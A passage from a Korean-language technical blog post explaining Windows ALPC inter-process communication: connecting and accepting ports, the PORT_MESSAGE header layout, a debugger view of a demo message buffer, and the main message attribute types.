PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>rdx&#xC5D0; PortName&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC8E0;, &#xC774;&#xB97C; &#xCD9C;&#xB825;&#xD574;&#xBCF4;&#xBA74; &#xC81C;&#xAC00; Server&#xB85C; &#xC62C;&#xB824;&#xB193;&#xC740; HakcyBoiz port&#xAC00; &#xB728;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xB807;&#xAC8C; Connect &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; Server&#xC5D0;&#xC11C; Accept &#xD560;&#xC9C0; &#xB9D0;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xAC8C; &#xB418;&#xACA0;&#xC8E0;?</p><p>&#xC77C;&#xB2E8; Server.c &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xC758; AlpcAcceptConnectPort &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74;</p><pre><code class="hljs cpp">ntRet = NtAlpcAcceptConnectPort(    &amp;hConnectedPort,   <span class="hljs-comment">// OUT PHANDLE PortHandle  &#x2192; rcx</span>    hPort,     <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       <span class="hljs-literal">NULL</span>,       &amp;pmRequest,         <span class="hljs-literal">NULL</span>,               TRUE              );</code></pre><p>&#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xC778;&#xC790;&#xAC00; &#xC138;&#xD305;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>rcx&#xC758; &#xACBD;&#xC6B0; &#xC11C;&#xBC84;&#xAC00; &#xC0C8;&#xB85C; &#xCC44;&#xC6CC;&#xC904; &#xD1B5;&#xC2E0; &#xD3EC;&#xD2B8; &#xD578;&#xB4E4;&#xC774;&#xBBC0;&#xB85C; syscall&#xC774; &#xC9C4;&#xD589;&#xB41C; &#xC774;&#xD6C4;&#xC5D0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; hConnectedPort&#xC5D0; &#xC2E4;&#xC81C; ALPC &#xC11C;&#xBC84; communication port &#xD578;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xD6C4;&#xC5D0; &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xC778; AcceptConnection &#xBD80;&#xBD84;&#xC774; TRUE&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; Accpet &#xB418;&#xC5B4; &#xC11C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xB418;&#xC5B4; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="3-ALPC-Messaging"><a href="#3-ALPC-Messaging" class="headerlink" title="3. ALPC Messaging"></a>3. ALPC Messaging</h2><p>&#xC774;&#xC81C; ALPC&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xD1B5;&#xC2E0;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8;, &#xC2E4;&#xC81C;&#xB85C; &#xC654;&#xB2E4; &#xAC14;&#xB2E4; &#xD558;&#xB294; &#xBA54;&#xC2DC;&#xC9C0; &#xD3EC;&#xB9F7;&#xC744; &#xAE4C;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;.</p><p>ALPC&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xD56D;&#xC0C1; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xB97C; &#xAC00;&#xC9C0;&#xB294;&#xB370;&#xC694;!</p><p><img src="image%2011.png" alt="image.png"></p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload(Data) ]</code></pre><p>&#xC55E;&#xBD80;&#xBD84;&#xC740; &#xACE0;&#xC815;&#xB41C; &#xD5E4;&#xB354; PORT_MESSAGE, &#xADF8; &#xB4A4;&#xB294; &#xC800;&#xD76C;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xBCF4;&#xB0B4;&#xACE0; &#xC2F6;&#xC740; text/binary &#xB370;&#xC774;&#xD130; &#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="3-1-PORT-MESSAGE-&#xAD6C;&#xC870;"><a href="#3-1-PORT-MESSAGE-&#xAD6C;&#xC870;" class="headerlink" title="3.1. PORT_MESSAGE &#xAD6C;&#xC870;"></a>3.1. PORT_MESSAGE &#xAD6C;&#xC870;</h3><p>&#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PORT_MESSAGE</span></span><span class="hljs-class">{</span>    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT DataLength;   <span class="hljs-comment">// &#xC2E4;&#xC81C; Payload &#xAE38;&#xC774;</span>            USHORT TotalLength;  <span class="hljs-comment">// PORT_MESSAGE + Payload &#xC804;&#xCCB4; &#xD06C;&#xAE30;</span>        } s1;        ULONG Length;    } u1;    <span class="hljs-keyword">union</span> {        <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>            USHORT Type;             <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xD0C0;&#xC785;</span>            USHORT DataInfoOffset;   <span class="hljs-comment">// Attribute &#xC601;&#xC5ED; &#xC624;&#xD504;&#xC14B;</span>        } s2;        ULONG ZeroInit;    } u2;    <span class="hljs-keyword">union</span> {        CLIENT_ID ClientId;          <span class="hljs-comment">// &#xC1A1;&#xC2E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC2A4;&#xB808;&#xB4DC; ID</span>        <span class="hljs-keyword">double</span>    DoNotUseThisField; <span class="hljs-comment">// (&#xC815;&#xB82C;&#xC6A9;)</span>    };    ULONG MessageId;                 <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; &#xC2DD;&#xBCC4;&#xC790;</span>    <span class="hljs-keyword">union</span> {        SIZE_T ClientViewSize;       <span class="hljs-comment">// &#xC139;&#xC158; &#xBDF0; &#xD06C;&#xAE30;</span>        ULONG  CallbackId;           <span class="hljs-comment">// &#xCF5C;&#xBC31; ID</span>    };} PORT_MESSAGE, *PPORT_MESSAGE;</code></pre><p>&#xC2E4;&#xC81C;&#xB85C; &#xC6B0;&#xB9AC;&#xAC00; &#xC790;&#xC8FC; &#xB9CC;&#xC9C0;&#xB294; &#xD544;&#xB4DC;&#xB294; &#xAC70;&#xC758; &#xB124; &#xAC1C; &#xC815;&#xB3C4;&#xB77C;&#xACE0; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><p>u1.s1.DataLength</p><p>  &#x2192; payload &#xAE38;&#xC774;</p></li><li><p>u1.s1.TotalLength</p><p>  &#x2192; sizeof(PORT_MESSAGE) + DataLength</p><p>  &#x2192; &#xCEE4;&#xB110;&#xC774; &#x201C;&#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#x201D;&#xB97C; &#xC54C;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;</p></li><li><p>ClientId</p><p>  &#x2192; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC2A4;&#xB808;&#xB4DC;&#xC758; ID</p></li><li><p>MessageId / CallbackId</p><p>  &#x2192; &#xC694;&#xCCAD;/&#xC751;&#xB2F5; &#xB9E4;&#xCE6D;&#xD560; &#xB54C; &#xC4F0;&#xB294; ID</p></li></ul><p>&#xC989;, &#xD3EC;&#xB9F7; &#xC790;&#xCCB4;&#xB294; &#xB418;&#xAC8C; &#xC2EC;&#xD50C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xC0AC;&#xC6A9;&#xD55C; &#xC608;&#xC81C; Client &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xBA74;:</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSG_LEN 0x100</span><span class="hljs-function">LPVOID <span class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span><span class="hljs-function">    LPVOID lpMem </span>= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>lpMem</code>&#xC774; &#xBC14;&#xB85C;</p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload ]</code></pre><p>&#xD615;&#xD0DC;&#xC758; &#xC644;&#xC131;&#xB41C; &#xD558;&#xB098;&#xC758; ALPC &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>main() &#xCABD;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC4F0;&#xC8E0;.</p><pre><code class="hljs cpp">RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);pmSend.u1.s1.DataLength  = <span class="hljs-built_in">strlen</span>(szInput);pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);ntRet = NtAlpcSendWaitReceivePort(    hPort,                <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,                    <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>                  <span class="hljs-comment">// Timeout</span>);</code></pre><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;</p><ol><li>pmSend &#xC548;&#xC5D0; DataLength, TotalLength &#xC138;&#xD305;</li><li><p>CreateMsgMem()&#xC73C;&#xB85C;</p><p> [pmSend | &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xBB38;&#xC790;&#xC5F4;] &#xD55C; &#xB369;&#xC5B4;&#xB9AC; &#xBC84;&#xD37C; lpMem &#xC0DD;&#xC131;</p></li><li><p>lpMem &#xD3EC;&#xC778;&#xD130;&#xB97C; NtAlpcSendWaitReceivePort&#xC758; SendMessage&#xB85C; &#xC804;&#xB2EC;</p></li></ol><p>&#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xC6A9;&#xB3C4; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;?</p><p><img src="image%2012.png" alt="image.png"></p><p>&#xC790; Client&#xC5D0;&#xC11C; <strong>&#x201C;Hello HackyBoiz!&#x201D;&#xB97C; &#xBCF4;&#xB0C8;&#xC744; &#xB54C;, &#xBC84;&#xD37C;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xACBC;&#xB294;&#xC9C0;</strong> &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp">ntRet = NtAlpcSendWaitReceivePort(    hPort,          <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,              <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>            <span class="hljs-comment">// Timeout</span>);</code></pre><p>&#xC800;&#xD76C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; NtAlpcSendWaitReceivePort &#xD568;&#xC218;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>lpMem &#xBCC0;&#xC218;&#xC5D0; &#xC544;&#xB9C8; &#xC800;&#xD76C;&#xAC00; &#xBCF4;&#xB0B8; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xB2F4;&#xACA8;&#xC788;&#xACA0;&#xC8E0;? &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%2013.png" alt="image.png"></p><p>r8 &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xBC14;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xCCB4; &#xBC84;&#xD37C;&#xC778;&#xB370;, PORT_MESSAGE + &#x201C;Hello HackyBoiz!&#x201D; &#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; DWORD &#xAC00; 00390011 &#xC778; &#xC774;&#xC720;&#xB294;</p><ul><li>&#xD558;&#xC704; 2&#xBC14;&#xC774;&#xD2B8; = <code>0x0011</code> &#x2192; DataLength = 0x11 = 17 (&#xBB38;&#xC790;&#xC5F4; &#xAE38;&#xC774;)</li><li>&#xC0C1;&#xC704; 2&#xBC14;&#xC774;&#xD2B8; = <code>0x0039</code> &#x2192; TotalLength = 0x39 = 57 (PORT_MESSAGE + payload)</li></ul><p>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;! </p><p>&#xC774;&#xB807;&#xAC8C; Send Buffer&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD55C; &#xB4A4;, Server&#xC758; Receive Buffer&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;!</p><h2 id="4-ALPC-Message-Attribute"><a href="#4-ALPC-Message-Attribute" class="headerlink" title="4. ALPC Message Attribute"></a>4. ALPC Message Attribute</h2><p>&#xC790; &#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB294; &#x201C;&#xD3EC;&#xD2B8;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xACE0;, &#xC5B4;&#xB5BB;&#xAC8C; &#xC5F0;&#xACB0;&#xD558;&#xACE0;, &#xC5B4;&#xB5BB;&#xAC8C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xB294;&#xC9C0;&#x201D;&#xB97C; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; ALPC&#xAC00; &#xADF8;&#xB0E5; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF4;&#xB0B4;&#xAE30;&#xB9CC; &#xD558;&#xB294; IPC&#xC600;&#xB2E4;&#xBA74; &#xAD73;&#xC774; &#xC774;&#xB807;&#xAC8C;&#xAE4C;&#xC9C0; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4; &#xC774;&#xC720;&#xAC00; &#xC5C6;&#xACA0;&#xC8E0;?</p><p>ALPC&#xAC00; &#xBCF5;&#xC7A1;&#xD55C; &#xC774;&#xC720;&#xB294; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF8;&#xBB38; &#xB9D0;&#xACE0;&#xB3C4; &#xAC01;&#xC885; &#xBD80;&#xAC00; &#xC815;&#xBCF4;(Attribute<strong>)</strong>&#xB97C; &#xAC19;&#xC774; &#xBD99;&#xC5EC;&#xC11C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;!</p><ul><li>&#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; (Impersonation)</li><li>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC; &#xC139;&#xC158;(View)</li><li>&#xD578;&#xB4E4;(&#xD30C;&#xC77C;/&#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC139;&#xC158; &#xB4F1;)</li><li>&#xD1A0;&#xD070; &#xC815;&#xBCF4;</li><li>&#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</li></ul><p>&#xC774;&#xB7F0; &#xAC83;&#xB4E4;&#xC744; &#xD55C; &#xBC88;&#xC758; NtAlpcSendWaitReceivePort &#xD638;&#xCD9C;&#xB85C; &#xAC19;&#xC774; &#xC6C0;&#xC9C1;&#xC774;&#xB294; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB77C;&#xACE0; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="4-1-Attribute-&#xBC84;&#xD37C;-&#xAD6C;&#xC870;"><a href="#4-1-Attribute-&#xBC84;&#xD37C;-&#xAD6C;&#xC870;" class="headerlink" title="4.1. Attribute &#xBC84;&#xD37C; &#xAD6C;&#xC870;"></a>4.1. Attribute &#xBC84;&#xD37C; &#xAD6C;&#xC870;</h3><p>&#xC55E;&#xC5D0;&#xC11C; &#xBD24;&#xB358; <code>NtAlpcSendWaitReceivePort()</code>&#xD568;&#xC218; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xBA74;, &#xC911;&#xAC04;&#xC5D0; Attribute &#xAD00;&#xB828; &#xC778;&#xC790;&#xAC00; &#xB450; &#xAC1C; &#xB354; &#xC788;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,    <span class="hljs-comment">// &#x2190; &#xC1A1;&#xC2E0; Attribute</span></span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes, <span class="hljs-comment">// &#x2190; &#xC218;&#xC2E0; Attribute</span></span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li><p><code>SendMessageAttributes</code></p><p>  &#x2192; &#xB0B4;&#xAC00; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C; &#xAC19;&#xC774; &#xBD99;&#xC774;&#xACE0; &#xC2F6;&#xC740; Attribute</p></li><li><p><code>ReceiveMessageAttributes</code></p><p>  &#x2192; &#xB098;&#xB294; &#xC751;&#xB2F5; &#xBC1B;&#xC744; &#xB54C; <em>**</em>&#xC5B4;&#xB5A4; Attribute&#xB97C; &#xBC1B;&#xACE0; &#xC2F6;&#xC740;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;</p></li></ul><p>&#xC989;, &#xC30D;&#xBC29; &#xD569;&#xC758; &#xAE30;&#xBC18; Attribute &#xC804;&#xB2EC; &#xAD6C;&#xB3C4;&#xB77C;&#xACE0; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xB124;&#xC694;!</p><p>Attribute &#xBC84;&#xD37C; &#xB9E8; &#xC55E;&#xC5D0;&#xB294; &#xACF5;&#xD1B5; &#xD5E4;&#xB354;&#xAC00; &#xD558;&#xB098; &#xBD99;&#xC5B4;&#xC788;&#xB294;&#xB370;&#xC694;,</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_ATTRIBUTES</span> {</span>    ULONG AllocatedAttributes;  <span class="hljs-comment">// &#xC774; &#xBC84;&#xD37C;&#xAC00; &#xC5B4;&#xB5A4; Attribute &#xACF5;&#xAC04;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0;</span>    ULONG ValidAttributes;     } ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;</code></pre><ul><li><p><code>AllocatedAttributes</code></p><p>  &#x2192; &#xC774; &#xBC84;&#xD37C;&#xC5D0; &#xC5B4;&#xB5A4; Attribute &#xD0C0;&#xC785;&#xB4E4; &#xACF5;&#xAC04;&#xC744; &#xD655;&#xBCF4;&#xD588;&#xB294;&#xC9C0; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB85C; &#xD45C;&#xD604;</p></li><li><p><code>ValidAttributes</code></p><p>  &#x2192; &#xC774;&#xBC88; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC720;&#xD6A8;&#xD55C; Attribute</p></li></ul><p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74;,</p><pre><code class="hljs ini"><span class="hljs-attr">AllocatedAttributes</span> = &#x201C;&#xC774; &#xBC84;&#xD37C;&#xC5D0; &#xBB50;&#xAE4C;&#xC9C0; &#xB2F4;&#xC744; &#xC218; &#xC788;&#xC74C;!&#x201D;<span class="hljs-attr">ValidAttributes</span> = &#x201C;&#xC774;&#xBC88; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC4F0;&#xB294; &#xAC83;&#x201D;</code></pre><p>&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="4-2-&#xC8FC;&#xC694;-Attribute-&#xC885;&#xB958;"><a href="#4-2-&#xC8FC;&#xC694;-Attribute-&#xC885;&#xB958;" class="headerlink" title="4.2 &#xC8FC;&#xC694; Attribute &#xC885;&#xB958;"></a>4.2 &#xC8FC;&#xC694; Attribute &#xC885;&#xB958;</h3><p>Attribute&#xB3C4; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xB300;&#xD45C;&#xC801;&#xC778; &#xBA87; &#xAC1C;&#xB9CC; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><blockquote><p><strong>1. &#xBCF4;&#xC548; &#xC18D;&#xC131; (Security Attribute)</strong></p></blockquote><p>&#xBC1C;&#xC2E0;&#xC790;&#xC758; &#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBA70;, &#xBA54;&#xC2DC;&#xC9C0; &#xC218;&#xC2E0; &#xCE21;&#xC740; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC2E0;&#xC790;&#xB97C; Impersonation&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_SECURITY_ATTR</span> {</span>    ULONG Flags;    PSECURITY_QUALITY_OF_SERVICE pQOS;    HANDLE ContextHandle;} ALPC_SECURITY_ATTR, *PALPC_SECURITY_ATTR;</code></pre><ul><li>pQos<ul><li>SECURITY_QUALITY_OF_SERVICE &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130;</li><li>&#xC5B4;&#xB5A4; &#xC218;&#xC900;&#xC758; impersonation, context tracking &#xB4F1;&#xC744; &#xD5C8;&#xC6A9;&#xD560;&#xC9C0; &#xC124;&#xC815;</li></ul></li><li>ContextHandle<ul><li>&#xCEE4;&#xB110;&#xC774; &#xAD00;&#xB9AC;&#xD558;&#xB294; security context &#xD578;&#xB4E4;</li></ul></li></ul><hr><blockquote><p><strong>2. View &#xC18D;&#xC131; (Data View Attribute)</strong></p></blockquote><p>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC; &#xC139;&#xC158;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC77C;&#xBC18; &#xBA54;&#xC2DC;&#xC9C0; &#xD06C;&#xAE30; &#xC81C;&#xD55C;(64KB)&#xC744; &#xCD08;&#xACFC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_DATA_VIEW_ATTR</span> {</span>    ULONG  Flags;    HANDLE SectionHandle;  <span class="hljs-comment">// ALPC &#xD3EC;&#xD2B8;&#xC5D0; attach&#xB41C; &#xC139;&#xC158; &#xD578;&#xB4E4;</span>    PVOID  ViewBase;       <span class="hljs-comment">// &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;</span>    SIZE_T ViewSize;       <span class="hljs-comment">// &#xB9E4;&#xD551; &#xD06C;&#xAE30;</span>} ALPC_DATA_VIEW_ATTR, *PALPC_DATA_VIEW_ATTR;</code></pre><ol><li><code>NtAlpcCreatePortSection</code> / <code>NtAlpcCreateSectionView</code> &#xB85C; &#xACF5;&#xC720; &#xC139;&#xC158; &#xC0DD;&#xC131; + &#xBDF0; &#xC124;&#xC815;</li><li>&#xADF8; &#xC815;&#xBCF4;&#xB97C; <code>ALPC_DATA_VIEW_ATTR</code> &#xC5D0; &#xB123;&#xACE0;</li><li>Attribute &#xBC84;&#xD37C;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xAC19;&#xC774; &#xC804;&#xC1A1;</li><li>&#xC0C1;&#xB300;&#xBC29;&#xC740; &#xC790;&#xC2E0;&#xC758; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xAC19;&#xC740; &#xC139;&#xC158; &#xBDF0;&#xB97C; &#xB9E4;&#xD551;&#xD574;&#xC11C; &#xAC19;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xACF5;&#xC720;</li></ol><hr><blockquote><p><strong>3. Context &#xC18D;&#xC131;</strong></p></blockquote><p>&#xD2B9;&#xC815; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xB610;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; 